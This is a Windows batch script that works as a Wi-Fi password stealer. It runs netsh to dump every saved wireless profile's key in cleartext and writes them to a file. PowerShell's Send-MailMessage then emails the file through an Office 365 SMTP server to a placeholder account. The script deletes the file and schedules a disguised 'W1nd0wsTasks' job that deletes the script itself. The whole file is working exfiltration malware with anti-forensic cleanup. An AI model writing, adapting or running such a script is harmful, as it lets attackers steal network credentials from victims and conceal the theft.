@echo off

:: wifi credentials file
set pathFile="%USERPROFILE%\file.txt" 

:: outlook: mail and password
set mail=mymail@domain
set pass=mypass

:: some creative name...
set tittle_homework=W1nd0wsTasks

:: filter strings
set str1="users" 
set str2="content"

(for /F "delims=: tokens=2" %%i in ( 

	'netsh wlan show profile ^| findstr /I %str1% '

	) do ( 

	@echo off && echo%%i && netsh wlan show profile%%i key=clear | findstr /I "%str2%"

) ) >> %pathFile% 

:: use the cmdlet SendMail-Message to send the wifi credentials file
PowerShell $key = ConvertTo-SecureString "%pass%" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential( '%mail%' , $key ); Send-MailMessage -From '%mail%' -To '%mail%' -Subject 'none' -Body 'Text' -Attachments '%pathFile%' -SmtpServer 'smtp.office365.com' -UseSsl -port '587' -Credential $cred;


del %pathFile%

:: get the time
for /F "tokens=1,2 delims=:" %%i in ('echo %TIME%') do (
    set /A hour=%%i
    set /A minute=%%j
)

set /A numberZ=0


:: setting minute and hour
if %minute% lss 57 (
	set /A minute=%minute%+2
) else (
	
	set /A hour=%hour%+1
	set /A minute=1

)

:: get the full path + name of the script
set pathScript=%~dp0%0


:: depending on the option set the task

if %hour% lss 10 if %minute% lss 10 (

	schtasks /create /tn %tittle_homework% /tr "cmd.exe /C del %pathScript%" /sc once /st %numberZ%%hour%:%numberZ%%minute%

)

if %hour% geq 10 if %minute% geq 10 (

	schtasks /create /tn %tittle_homework% /tr "cmd.exe /C del %pathScript%" /sc once /st %hour%:%minute%
    
)

if %hour% lss 10 if %minute% geq 10 (

	schtasks /create /tn %tittle_homework% /tr "cmd.exe /C del %pathScript%" /sc once /st %numberZ%%hour%:%minute%
    
)

if %hour% geq 10 if %minute% lss 10 (

	schtasks /create /tn %tittle_homework% /tr "cmd.exe /C del %pathScript%" /sc once /st %hour%:%numberZ%%minute%

)
